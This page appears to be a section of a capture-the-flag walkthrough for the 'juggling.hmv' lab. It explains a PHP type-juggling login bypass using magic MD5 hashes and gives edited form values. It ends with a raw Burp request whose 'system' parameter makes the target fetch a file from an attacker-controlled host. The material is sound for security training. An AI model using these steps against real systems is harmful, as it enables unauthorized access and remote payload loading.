<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>3.2 How to get the session?</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">3.2 How to get the session?</h1><br/><br /><br /><strong>MAGIC HASHES</strong><br />• Magic hashes are well known specific hashes used to exploit <a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">Type Juggling attacks in PHP</a>.<br />• The secret is that <code>md5('240610708')</code> is <code>'0e462097431906509019562988736854'</code> and <code>md5('QNKCDZO')</code> is <code>'0e830400451993494058024219903391'</code>.<br />• Both are of the form 0e{bunch of digits}, a valid scientific notation. So when PHP's <code>==</code> decides to convert both sides to numbers to see if it can get a match, they're both converted to <code>float(0)</code>, and thus the equality is true.<br /><br /><br />1. Navigate to  <a href="http://juggling.hmv/blog.php?page=test.">http://juggling.hmv</a>.<br />   <br />2. With “Develop Tools” edit the code and leave it as I show you below.<br />    <div class="codebox"><div class="codebox"><br /><span style="color:#008a8c;font-weight:400">&lt;div</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="form-group&nbsp;mb-2"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;label</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="label"</span><span style="color:#008a8c;font-weight:400">&gt;</span>Username<span style="color:#008a8c;font-weight:400">&lt;/label&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;input</span>&nbsp;<span style="color:#6a5acd;font-weight:400">type="text"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">name="username"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="form-control"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">placeholder="Username"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">required=""</span>&nbsp;<span style="color:#6a5acd;font-weight:400">value="QNKCD"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br /><span style="color:#008a8c;font-weight:400">&lt;/div&gt;</span><br /><br /><span style="color:#008a8c;font-weight:400">&lt;div</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="form-group&nbsp;mb-4"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;label</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="label"</span><span style="color:#008a8c;font-weight:400">&gt;</span>Password<span style="color:#008a8c;font-weight:400">&lt;/label&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;input</span>&nbsp;<span style="color:#6a5acd;font-weight:400">type="password"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">name="password"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="form-control"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">placeholder="Password"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">required=""</span>&nbsp;<span style="color:#6a5acd;font-weight:400">value="ZO"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br /><span style="color:#008a8c;font-weight:400">&lt;/div&gt;</span><br /><br /><span style="color:#008a8c;font-weight:400">&lt;div</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="container"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;div</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="row&nbsp;justify-content-md-center"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;div</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="col&nbsp;col-lg-5"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;input</span>&nbsp;<span style="color:#6a5acd;font-weight:400">type="text"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">name="val1"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="form-control"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">placeholder="Value&nbsp;1"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">value="a"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;/div&gt;</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;div</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="col&nbsp;col-lg-5"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;input</span>&nbsp;<span style="color:#6a5acd;font-weight:400">type="text"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">name="val2"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="form-control"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">placeholder="Value&nbsp;2"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">value="A"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;/div&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;/div&gt;</span><br /><span style="color:#008a8c;font-weight:400">&lt;/div&gt;</span><br /><br /><span style="color:#008a8c;font-weight:400">&lt;div</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="mt-5"</span><span style="color:#008a8c;font-weight:400">&gt;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#008a8c;font-weight:400">&lt;button</span>&nbsp;<span style="color:#6a5acd;font-weight:400">type="submit"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">name="submit"</span>&nbsp;<span style="color:#6a5acd;font-weight:400">class="form-control&nbsp;btn&nbsp;btn-primary&nbsp;rounded&nbsp;submit"</span><span style="color:#008a8c;font-weight:400">&gt;</span>Sign&nbsp;In<span style="color:#008a8c;font-weight:400">&lt;/button&gt;</span><br /><span style="color:#008a8c;font-weight:400">&lt;/div&gt;</span><br /></div></div><br />   <br />3. Click on the “Sign in” button.<br />   <img src="images/951-1.png" alt="images/951-1.png" /><br /><br />    <img src="images/951-2.png" alt="images/951-2.png" /><br /><br />    You're logged in.<br /><br />4. In “Burp Suite” go to “Proxy-&gt;HTTP history” and send the “POST index.php” to “Repeater”.<br />   <img src="images/951-3.png" alt="images/951-3.png" />    <br />   <img src="images/951-4.png" alt="images/951-4.png" /><br /><br />5. In “Burp Repeater”,  copy the following code in a new tab.<br />   <div class="codebox"><div class="codebox">POST&nbsp;/index.php&nbsp;HTTP/1.1<br />Host:&nbsp;s3cur3.juggling.hmv<br />User-Agent:&nbsp;Mozilla/5.0&nbsp;(X11;&nbsp;Linux&nbsp;x86_64;&nbsp;rv:78.0)&nbsp;Gecko/20100101&nbsp;Firefox/78.0<br />Accept:&nbsp;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />Accept-Language:&nbsp;en-US,en;q=0.5<br />Accept-Encoding:&nbsp;gzip,&nbsp;deflate<br />Referer:&nbsp;http://juggling.hmv/index.php<br />Content-Type:&nbsp;application/x-www-form-urlencoded<br />Content-Length:&nbsp;41<br />Origin:&nbsp;http://juggling.hmv<br />Connection:&nbsp;close<br />Cookie:&nbsp;PHPSESSID=nnvukukvbhu28i7pnlohcsb40l;&nbsp;path=/;&nbsp;domain=s3cur3.juggling.hmv<br />Upgrade-Insecure-Requests:&nbsp;1<br /><br />system=http://192.168.12.10:8000/test.txt</div></div><br /><br />    Replace PHPSESSID with the value from the previous step.<br />    </div></body></html>